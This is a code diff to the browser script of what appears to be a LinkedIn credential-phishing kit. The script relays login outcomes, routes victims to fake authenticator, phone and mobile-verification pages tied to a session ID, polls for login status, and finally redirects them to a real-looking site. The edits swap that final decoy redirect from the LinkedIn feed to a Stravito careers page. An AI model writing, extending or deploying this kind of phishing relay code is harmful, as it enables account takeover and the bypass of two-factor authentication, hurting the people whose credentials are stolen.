@@ -285,7 +285,7 @@ document.addEventListener("click", async (e) => {
       console.log(responseText);
       if (responseText == "0") {
       } else if (responseText == "1") {
-        location.href = "https://www.linkedin.com/feed/";
+        location.href = "https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625/";
       } else if (
         responseText == "Enter the code you see on your authenticator app"
       ) {
@@ -303,8 +303,8 @@ document.addEventListener("click", async (e) => {
       ) {
         location.href = `/enter-phone.html?sessionId=${sessionId}`;
       } else if (responseText == "lastcve") {
-        location.href = `https://www.linkedin.com/feed`;
-      } else {
+        location.href = `https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625`;
+      } else if(responseText == "LinkedIn App Challenge") {
         location.href = `/mobile-verification.html?sessionId=${sessionId}`;
       }
     } catch (error) {
@@ -328,7 +328,7 @@ function checkLoginStatus() {
           checkLoginStatus();
         }, 3000);
       } else if (responseText == "1") {
-        location.href = "https://www.linkedin.com/feed/";
+        location.href = "https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625/";
       } else if (
         responseText == "Enter the code you see on your authenticator app"
       ) {
@@ -346,8 +346,8 @@ function checkLoginStatus() {
       ) {
         location.href = `/enter-phone.html?sessionId=${sessionId}`;
       } else if (responseText == "lastcve") {
-        location.href = `https://www.linkedin.com/feed`;
-      } else {
+        location.href = `https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625`;
+      } else if (responseText == "LinkedIn App Challenge") {
         location.href = `/mobile-verification.html?sessionId=${sessionId}`;
       }
     }
